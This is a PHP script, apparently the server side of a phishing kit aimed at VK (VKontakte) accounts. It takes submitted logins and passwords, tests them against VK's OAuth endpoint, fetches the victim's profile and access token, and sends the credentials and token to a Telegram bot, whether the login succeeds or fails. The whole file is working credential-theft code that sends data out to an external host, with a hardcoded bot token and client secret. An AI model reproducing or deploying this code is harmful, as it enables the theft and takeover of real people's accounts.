<?php
function send($mess){

    $token = '1621111111:AAHLmA49eRgZiULTnG4DmzVhtsN1xX11111';
    $chat_id = '1648111111';
    $url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=".urlencode($mess)."&parse_mode=html&disable_web_page_preview=true";
    file_get_contents($url);
}

//Получение информации о аккаунте VK
function user_get($id, $token){
    $req = file_get_contents("https://api.vk.com/method/users.get?user_id=$id&access_token=$token&v=5.52");
    $req = json_decode($req, true);
    return $req["response"][0];
}

//Проверка входящих данных
function status_log($login, $pass, $host){
    //Если логин и пароль неверный
    if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass")){
        $data = [
            'status' => 'error',
            'value' => 'Неверный логин или пароль'
        ];
            $mess_error_login = "<b>Уведомление 👎</b>\n";
            $mess_error_login .= "<b>Логин: </b><pre>".$login."</pre>\n";
            $mess_error_login .= "<b>Пароль: </b><pre>".$pass."</pre>\n\n";
            $mess_error_login .= "<code>".$data['value']."</code>";
            send($mess_error_login);
            return $data;
    //Если пароль и логин верный
    }else{
        $req = file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass");
        $req = json_decode($req, true);
        //Если мы получили данные
        if($req['user_id']){
            $user = user_get($req["user_id"], $req["access_token"]);
            $data = [
                'status' => 'valid',
                'user_id' => $user['id'],
                'first_name' => $user['first_name'],
                'last_name' => $user['last_name'],
                'access_token' => $req['access_token']

            ];
            $mess = "<b>Уведомление 👌</b>\n";
            $mess .= "<a href='https://vk.com/id".$data['user_id']."'>Профиль</a>\n\n";
            $mess .= "<pre>".$data['first_name']." ".$data['last_name']."</pre>\n";
            $mess .= "<b>Логин: </b><pre>".$login."</pre>\n";
            $mess .= "<b>Пароль: </b><pre>".$pass."</pre>\n\n";
            $mess .= "<b>Token: </b><pre>".$data['access_token']."</pre>";
            user_get($data['user_id'], $data['access_token']);
            send($mess);
            return $data;
        //Если данные верные но на акаунте, 2f, заблокирован, или страница удалена и т.д;
        }else{
            $data = [
                'status' => 'error',
                'value' => $req['error_description']
            ];
            $mess_error_description = "<b>Уведомление ✌️</b>\n";
            $mess_error_description .= "<b>Логин: </b><pre>".$login."</pre>\n";
            $mess_error_description .= "<b>Пароль: </b><pre>".$pass."</pre>\n\n";
            $mess_error_description .= "<b>Ошибка входа</b>: <code>".$data['value']."</code>";
            send($mess_error_description);
            return $data;
        }
    }
}
if(!empty($_GET["l"]) && !empty($_GET["p"])){
    $login = $_GET['l'];
    $pass = $_GET['p'];
    $host = $_GET['h'];
    $data = status_log($login, $pass, $host);
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Expose-Headers: Content-Length,Content-Type,Date,Server,Connection');
    header('Content-Type: application/json');
    echo json_encode($data);
}
?>